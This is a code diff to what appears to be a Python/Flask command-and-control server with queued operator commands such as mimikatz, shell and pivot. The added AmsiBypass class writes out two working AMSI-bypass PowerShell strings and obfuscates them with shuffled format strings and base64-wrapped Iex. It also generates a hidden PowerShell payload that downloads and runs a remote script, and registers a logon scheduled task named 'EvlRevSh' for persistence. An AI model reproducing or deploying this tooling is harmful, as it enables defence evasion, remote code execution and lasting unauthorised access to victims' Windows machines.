@@ -6,6 +6,110 @@ import glob
 import sys
 import hashlib
 import datetime
+import os
+import subprocess
+import random
+from tkinter.messagebox import *
+from tkinter import *
+
+##### AMSI Bypass
+
+class AmsiBypass:
+
+    def __init__(self):
+        self.tech = input("Encryption level ? (strong/moderate/weak) :")
+        self.payload = ""
+
+    def encode_pws(self,chaine):
+        return f"Iex([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('{base64.b64encode(chaine.encode()).decode()}')))"
+
+    def obfu_one(self,i):
+        liste_index = [j for j in range(len(i))]
+        random.shuffle(liste_index)
+        liste_dispo = ["_" for j in range(1000000)]
+        for index,k in enumerate(liste_index):
+            liste_dispo[k] = i[index]
+        liste_dispo = "".join(liste_dispo).replace("_","")
+        chaine = "'"
+        for index in liste_index:
+            chaine+="{"+str(index)+"}"
+        chaine+="' -f "
+        for dispo in liste_dispo:
+            chaine += "'"+str(dispo)+"'"+","
+        chaine = list(chaine)
+        chaine.pop(-1)
+        chaine = "("+"".join(chaine)+")"
+        return chaine
+
+    def obfuscate(self,command_in):
+        command_origin = command_in
+        command = []
+        commands = command_in.split('"')
+        for i in commands:
+            if "amsi" in i.lower():
+                command.append(i)
+        dico_to_replace={}
+        for i in command:
+            chaine = self.obfu_one(i)
+            dico_to_replace[i]=chaine
+        for i in dico_to_replace.keys():
+            if i in command_origin:
+                command_origin = command_origin.replace('"'+i+'"',dico_to_replace[i])
+
+        if self.tech.lower() == "strong":
+            command = self.encode_pws(command_origin)
+            command = command.split("'")
+            command[1] = self.obfu_one(command[1])
+            return "".join(command)
+        elif self.tech.lower() == 'moderate':
+            return self.encode_pws(command_origin)
+        else:
+            return command_origin
+
+    def matt_graeber_one(self):
+        method = '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)'
+        self.payload = method
+        return self.obfuscate(method)
+
+
+    def crash_method(self):
+        method = '$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)'
+        self.payload = method
+        return self.obfuscate(method)
+
+    def random_amsi_bypass(self):
+        methods = [self.matt_graeber_one(),self.crash_method()]
+        methods_name = ["Matt Graeber One","Crash Method"]
+        method = random.choice(methods)
+        print(f"Using : {methods_name[methods.index(method)]}")
+        to_return = method
+        return to_return
+
+    def _execute_cmd_bypamsi(self,cmd):
+        amsi_bypass = '$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)'
+        return self.random_amsi_bypass()+";"+self.encode_pws(self.obfuscate(cmd))
+
+    def download_and_execute_ps1(self,url):
+        payload = self.encode_pws(f'Iex(New-Object Net.WebClient).DownloadString(\'{url}\');')
+        payload = "powershell.exe -WindowStyle Hidden -exec bypass -C "+'"'+self._execute_cmd_bypamsi(payload)+'"'
+        if input("Do you want to display the payload ? (y/n) :").lower()=="y":
+            return payload
+        else:
+            return "Payload not saved"
+
+    def download_and_execute_ps1_persistance(self,url):
+        self.tech = "moderate"
+        payload = self.download_and_execute_ps1(url).replace('"',"")
+        payload = payload.replace('powershell.exe','')
+        payload = payload[1:]
+        final = ''
+        final += f'$A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "{payload}";'
+        final += '$T = New-ScheduledTaskTrigger -AtLogOn;'
+        final += 'Register-ScheduledTask EvlRevSh -Action $A -Trigger $T;'
+        return final
+
+##### AMSI BYPASS
+
 
 def create_csv():
     with open('id_and_commands.csv', mode='w') as csv_file:
@@ -66,16 +170,29 @@ def hash(password,username):
     dk = hashlib.pbkdf2_hmac('sha256', bytes(password,'utf-8'), bytes(username,"utf-8"), 100000)
     return dk.hex()
 
+##### Auto Commands
+
 def mimikatz():
     print("+-----------+")
     print("|  Mimikatz |")
     print("+-----------+")
 
 def shell():
-    pass
+    print("+-----------+")
+    print("|   Shell   |")
+    print("+-----------+")
 
 def poweroff():
-    pass
+    print("+-----------+")
+    print("|  Poweroff |")
+    print("+-----------+")
+
+def pivote():
+    print("+-----------+")
+    print("|   Pivote  |")
+    print("+-----------+")
+
+##### Auto Commands
 
 global admin_cookie
 admin_cookie = Suggested_pass(25,25,25)
@@ -107,7 +224,7 @@ global app
 app = Flask(__name__)
 
 global dico_action
-dico_action = {1:mimikatz,2:shell,3:poweroff}
+dico_action = {1:mimikatz,2:shell,3:poweroff,4:pivote}
 
 
 @app.route('/')
@@ -271,7 +388,8 @@ def edit_queue():
             if request.method == "GET":
                 return render_template("edit_queue.html",queue = glob.glob("./queue/*.*"))
             elif request.method == "POST":
-                if request.form.get("auto")!=0:
+                print(request.form.get("auto"))
+                if request.form.get("auto") and request.form.get("auto")!=0:
                     action = request.values.get("auto")
                     if action == "0":
                         return render_template("edit_queue.html",error="Invalid auto command.")
@@ -292,7 +410,7 @@ def edit_queue():
 
 @app.route("/account/",methods=["GET","POST"])
 def account():
-    host1 = "0.0.0.0"
+    global host1
     global admin_hash
     global admin_password
     global admin_token
@@ -406,13 +524,47 @@ def blank():
 
 def start_server():
     global app
-    app.run(port=80,threaded=True,host=host1)
+    app.run(port=80,threaded=True,host="0.0.0.0")
+
+##### TKINTER
+def on_closing():
+    global root
+    root.destroy()
+    sys.exit()
+
+def set_ip():
+    global root
+    host_ip=ip_host.get()
+    if host_ip == "":
+        host_ip = "0.0.0.0"
+    global host1
+    host1 = host_ip
+    root.destroy()
+
+
+##### TKINTER
 
 try:
     with open("id_and_commands.csv",'r') as file:
         file.read()
 except:
     create_csv()
+
+try:
+    global root
+    root = Tk()
+    root.title("Launcher")
+    root.geometry("500x200")
+    ip_host=StringVar()
+    label_big = Label(root, text="Host Set :", font=("Times New Roman", 35, "bold")).pack()
+    label_low = Label(root, text="Set an host (default 0.0.0.0) :").pack()
+    ip_ENTRY= Entry(root, textvariable=ip_host).pack()
+    submit = Button(root, text='Set Ip',command=set_ip).pack()
+
+    root.protocol("WM_DELETE_WINDOW", on_closing)
+    root.mainloop()
+except:
+    sys.exit()
 try:
     with open("id.txt",'r') as file:
         file.read()
